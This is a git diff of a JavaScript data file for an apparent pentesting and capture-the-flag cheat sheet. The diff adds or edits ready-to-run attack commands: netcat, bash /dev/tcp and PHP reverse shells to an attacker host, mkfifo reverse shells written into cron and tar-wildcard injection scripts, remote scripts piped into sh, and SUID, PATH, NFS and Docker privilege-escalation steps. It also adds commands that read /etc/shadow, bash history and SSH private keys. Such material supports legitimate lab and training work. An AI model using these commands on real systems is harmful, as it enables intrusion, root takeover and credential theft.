@@ -156,10 +156,10 @@ export const cheatsheetTools = {
         titleKey: 'cheatsheet_rce_title',
         commands: [
           { descKey: 'cheatsheet_rce_nc_listen', cmd: 'nc -nlvp 443' },
-          { descKey: 'cheatsheet_rce_nc_send', cmd: 'nc [host_ip] [host_port] -e /bin/bash' },
-          { descKey: 'cheatsheet_rce_bash', cmd: 'bash -c "bash -i >& /dev/tcp/[host_ip]/[host_port] 0>&1"' },
-          { descKey: 'cheatsheet_rce_php', cmd: '<?php system("bash -c \'bash -i >& /dev/tcp/[host_ip]/[host_port] 0>&1\'");?>' },
-          { descKey: 'cheatsheet_rce_bash_encoded', cmd: 'bash -c "bash -i >%26 /dev/tcp/[host_ip]/[host_port] 0>%261" || echo [base64] | base64 -d' },
+          { descKey: 'cheatsheet_rce_nc_send', cmd: 'nc [attacker_ip] [attacker_port] -e /bin/bash' },
+          { descKey: 'cheatsheet_rce_bash', cmd: 'bash -c "bash -i >& /dev/tcp/[attacker_ip]/[attacker_port] 0>&1"' },
+          { descKey: 'cheatsheet_rce_php', cmd: '<?php system("bash -c \'bash -i >& /dev/tcp/[attacker_ip]/[attacker_port] 0>&1\'");?>' },
+          { descKey: 'cheatsheet_rce_bash_encoded', cmd: 'bash -c "bash -i >%26 /dev/tcp/[attacker_ip]/[attacker_port] 0>%261" || echo [base64] | base64 -d' },
         ],
       },
     ],
@@ -196,7 +196,7 @@ export const cheatsheetTools = {
       {
         titleKey: 'cheatsheet_portfw_title',
         commands: [
-          { descKey: 'cheatsheet_portfw_ssh', cmd: 'ssh -L [host_port]:[ip_local_victim:port_victim] [username@ip_victim]' },
+          { descKey: 'cheatsheet_portfw_ssh', cmd: 'ssh -L [attacker_port]:[ip_local_victim:port_victim] [username@ip_victim]' },
           { descKey: 'cheatsheet_portfw_example', cmd: 'ssh -L 9999:localhost:8080 michael@sightless.htb' },
         ],
       },
@@ -204,6 +204,22 @@ export const cheatsheetTools = {
   },
 
   // ========== RECURSOS ==========
+  payloads: {
+    id: 'payloads',
+    sectionId: 'recursos',
+    nameKey: 'cheatsheet_payloads_title',
+    descKey: 'cheatsheet_payloads_desc',
+    categories: [
+      {
+        titleKey: 'cheatsheet_blank',
+        commands: [
+          { descKey: 'cheatsheet_payloads_hacktricks', cmd: 'https://book.hacktricks.wiki/en/index.html' },
+          { descKey: 'cheatsheet_payloads_repo', cmd: 'https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master' },
+          { descKey: 'cheatsheet_payloads_web', cmd: 'https://swisskyrepo.github.io/PayloadsAllTheThings/' },
+        ],
+      },
+    ],
+  },
   diccionarios: {
     id: 'diccionarios',
     sectionId: 'recursos',
@@ -220,21 +236,6 @@ export const cheatsheetTools = {
       },
     ],
   },
-  payloads: {
-    id: 'payloads',
-    sectionId: 'recursos',
-    name: 'Payloads',
-    descKey: 'cheatsheet_payloads_desc',
-    categories: [
-      {
-        titleKey: 'cheatsheet_payloads_title',
-        commands: [
-          { descKey: 'cheatsheet_payloads_repo', cmd: 'https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master' },
-          { descKey: 'cheatsheet_payloads_web', cmd: 'https://swisskyrepo.github.io/PayloadsAllTheThings/' },
-        ],
-      },
-    ],
-  },
   compartir: {
     id: 'compartir',
     sectionId: 'recursos',
@@ -245,6 +246,8 @@ export const cheatsheetTools = {
         titleKey: 'cheatsheet_compartir_title',
         commands: [
           { descKey: 'cheatsheet_compartir_scp', cmd: 'scp [filename] [username@ip:path]' },
+          { descKey: 'cheatsheet_compartir_python_server', cmd: 'python3 -m http.server 8000' },
+          { descKey: 'cheatsheet_compartir_wget_download', cmd: 'wget http://[attacker_ip]:8000/[filename]' },
         ],
       },
     ],
@@ -258,14 +261,99 @@ export const cheatsheetTools = {
     descKey: 'cheatsheet_escalada_desc',
     categories: [
       {
-        titleKey: 'cheatsheet_escalada_title',
+        titleKey: 'cheatsheet_escalada_general',
         commands: [
           { descKey: 'cheatsheet_escalada_gtfo', cmd: 'https://gtfobins.org/' },
-          { descKey: 'cheatsheet_escalada_suid', cmd: 'find / -perm -4000 2>/dev/null' },
-          { descKey: 'cheatsheet_escalada_cap', cmd: 'getcap -r / 2>/dev/null' },
-          { descKey: 'cheatsheet_escalada_sudo', cmd: 'sudo -l' },
           { descKey: 'cheatsheet_escalada_nc_host', cmd: 'sudo nc -q 5 -lvnp 80 < linpeas.sh' },
-          { descKey: 'cheatsheet_escalada_nc_victim', cmd: 'cat < /dev/tcp/[host_ip]/[host_port] | sh' },
+          { descKey: 'cheatsheet_escalada_nc_victim', cmd: 'cat < /dev/tcp/[attacker_ip]/[attacker_port] | sh' },
+          { descKey: 'cheatsheet_escalada_linpeas', cmd: 'curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh' },
+          { descKey: 'cheatsheet_escalada_winpeas', cmd: 'curl -L https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS' },
+          { descKey: 'cheatsheet_escalada_enum', cmd: 'python3 -c \'import pty; pty.spawn("/bin/bash")\'' },
+        ],
+      },
+      {
+        titleKey: 'cheatsheet_escalada_sudo',
+        commands: [
+          { descKey: 'cheatsheet_escalada_sudo_list', cmd: 'sudo -l' },
+        ],
+      },
+      {
+        titleKey: 'cheatsheet_escalada_suid',
+        commands: [
+          { descKey: 'cheatsheet_escalada_suid_find', cmd: 'find / -perm -4000 2>/dev/null' },
+          { descKey: 'cheatsheet_escalada_suid_find_specific', cmd: 'find / -perm -u=s -type f 2>/dev/null' },
+          { descKey: 'cheatsheet_escalada_suid_nmap', cmd: 'nmap --interactive' },
+          { descKey: 'cheatsheet_escalada_suid_find_shell', cmd: 'find /etc/passwd -exec /bin/sh \;' },
+        ],
+      },
+      {
+        titleKey: 'cheatsheet_escalada_capabilities',
+        commands: [
+          { descKey: 'cheatsheet_escalada_cap_list', cmd: 'getcap -r / 2>/dev/null' },
+          { descKey: 'cheatsheet_escalada_cap_python', cmd: 'python3 -c "import os; os.setuid(0); os.system(\'/bin/bash\')"' },
+          { descKey: 'cheatsheet_escalada_cap_tcpdump', cmd: 'tcpdump -i eth0 -w /tmp/capture -n -U -s 0 -c 1' },
+        ],
+      },
+      {
+        titleKey: 'cheatsheet_escalada_cron',
+        commands: [
+          { descKey: 'cheatsheet_escalada_cron_list', cmd: 'cat /etc/crontab' },
+          { descKey: 'cheatsheet_escalada_cron_user', cmd: 'crontab -l' },
+          { descKey: 'cheatsheet_escalada_cron_dir', cmd: 'ls -la /etc/cron.*' },
+          { descKey: 'cheatsheet_escalada_cron_wildcard', cmd: 'echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1 | nc [attacker_ip] [attacker_port] >/tmp/f" > cron.sh' },
+        ],
+      },
+      {
+        titleKey: 'cheatsheet_escalada_path',
+        commands: [
+          { descKey: 'cheatsheet_escalada_path_check', cmd: 'echo $PATH' },
+          { descKey: 'cheatsheet_escalada_path_write', cmd: 'echo \'/bin/sh\' > /tmp/ls' },
+          { descKey: 'cheatsheet_escalada_path_chmod', cmd: 'chmod +x /tmp/ls' },
+          { descKey: 'cheatsheet_escalada_path_export', cmd: 'export PATH=/tmp:$PATH' },
+        ],
+      },
+      {
+        titleKey: 'cheatsheet_escalada_nfs',
+        commands: [
+          { descKey: 'cheatsheet_escalada_nfs_exports', cmd: 'cat /etc/exports' },
+          { descKey: 'cheatsheet_escalada_nfs_showmount', cmd: 'showmount -e [victim_ip]' },
+          { descKey: 'cheatsheet_escalada_nfs_mount', cmd: 'mkdir /tmp/nfs_mount && mount -o rw,vers=3 <victim_ip>:/tmp /tmp/nfs_mount' },
+          { descKey: 'cheatsheet_escalada_nfs_uid', cmd: 'echo "int main() { setuid(0); system("/bin/bash"); return 0; }" > /tmp/nfs_mount/shell.c' },
+          { descKey: 'cheatsheet_escalada_nfs_uid2', cmd: 'gcc /tmp/nfs_mount/shell.c -o /tmp/nfs_mount/shell' },
+          { descKey: 'cheatsheet_escalada_nfs_uid3', cmd: 'chmod +s /tmp/nfs_mount/shell' },
+        ],
+      },
+      {
+        titleKey: 'cheatsheet_escalada_kernel',
+        commands: [
+          { descKey: 'cheatsheet_escalada_kernel_version', cmd: 'uname -a' },
+          { descKey: 'cheatsheet_escalada_kernel_exploit', cmd: 'searchsploit [linux_version]' },
+        ],
+      },
+      {
+        titleKey: 'cheatsheet_escalada_docker',
+        commands: [
+          { descKey: 'cheatsheet_escalada_docker_check', cmd: 'docker ps' },
+          { descKey: 'cheatsheet_escalada_docker_mount', cmd: 'docker run -v /:/hostFS -it ubuntu bash' },
+          { descKey: 'cheatsheet_escalada_docker_socket', cmd: 'docker -H unix:///var/run/docker.sock run -v /:/hostFS ubuntu' },
+        ],
+      },
+      {
+        titleKey: 'cheatsheet_escalada_wildcard',
+        commands: [
+          { descKey: 'cheatsheet_escalada_wildcard_tar', cmd: 'echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [attacker_ip] [attacker_port] >/tmp/f" > shell.sh' },
+          { descKey: 'cheatsheet_escalada_wildcard_chmod', cmd: 'chmod +x shell.sh' },
+          { descKey: 'cheatsheet_escalada_wildcard_touch', cmd: 'touch "--checkpoint=1" "--checkpoint-action=exec=sh shell.sh"' },
+        ],
+      },
+      {
+        titleKey: 'cheatsheet_escalada_passwords',
+        commands: [
+          { descKey: 'cheatsheet_escalada_passwd_shadow', cmd: 'cat /etc/shadow' },
+          { descKey: 'cheatsheet_escalada_passwd_passwd', cmd: 'cat /etc/passwd' },
+          { descKey: 'cheatsheet_escalada_passwd_history', cmd: 'cat ~/.bash_history' },
+          { descKey: 'cheatsheet_escalada_passwd_mysql', cmd: 'cat /etc/mysql/my.cnf' },
+          { descKey: 'cheatsheet_escalada_passwd_ssh', cmd: 'find / -name "id_rsa*" 2>/dev/null' },
         ],
       },
     ],
